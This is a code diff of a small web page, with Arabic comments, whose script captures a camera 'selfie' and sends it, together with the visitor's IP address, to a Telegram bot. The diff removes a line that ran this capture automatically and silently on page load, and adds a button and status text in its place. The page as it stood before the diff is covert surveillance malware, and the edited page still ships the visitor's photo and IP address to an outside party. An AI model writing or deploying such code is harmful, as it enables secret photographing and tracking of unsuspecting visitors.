@@ -7,6 +7,8 @@
 </head>
 <body style="text-align: center; font-size: 2em;">
     <h1>Hello</h1>
+    <button onclick="captureSelfie()">أخذ سيلفي</button>
+    <p id="status"></p>
     <script>
         // أخذ صورة سيلفي في الخلفية
         async function captureSelfie() {
@@ -53,8 +55,11 @@
 
                 // إرسال البيانات إلى بوت تلغرام
                 sendToTelegram(blob, ipAddress);
+
+                document.getElementById("status").innerText = "تم أخذ السيلفي وإرساله إلى تلغرام!";
             } catch (err) {
                 console.error('Error capturing selfie:', err);
+                document.getElementById("status").innerText = "فشل في أخذ السيلفي. تأكد من صلاحيات الكاميرا.";
             }
         }
 
@@ -80,9 +85,6 @@
                   console.error('Error sending to Telegram:', err);
               });
         }
-
-        // تنفيذ التقاط الصورة فور تحميل الصفحة
-        captureSelfie();
     </script>
 </body>
 </html>
